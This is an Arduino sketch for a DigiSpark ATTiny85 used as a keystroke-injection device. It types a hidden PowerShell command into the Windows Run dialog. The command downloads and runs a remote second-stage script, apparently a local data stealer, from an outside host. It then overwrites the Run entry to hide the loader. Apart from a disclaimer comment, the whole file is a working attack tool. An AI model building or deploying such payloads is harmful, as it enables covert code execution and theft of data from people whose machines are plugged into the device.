// Use this script at your own risk. The author assumes no responsibility for any illegal or improper use of the code

#include "DigiKeyboard.h"

void setup() {
  // Hit "Win+R" to open the "Run" program and type the Powershell command inside it to download the 2nd stage
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Add a delay to make sure that "Run" is opened before typing any command
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell.exe -windowstyle hidden -command \"$w=New-Object net.webclient; $c=$w.DownloadString('https://raw.githubusercontent.com/LucaReggiannini/local-data-stealer-ATTiny85/master/lds.ps1'); IEX $c;\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // "Run" saves the last command launched and shows it at the next opening.
  // To prevent the Loader code from being visible, open "Run" again and overwrite the old command with a new one
  // Warning: the Loader code will still be visible in the "Run" history!
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("explorer");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  }

void loop() {}
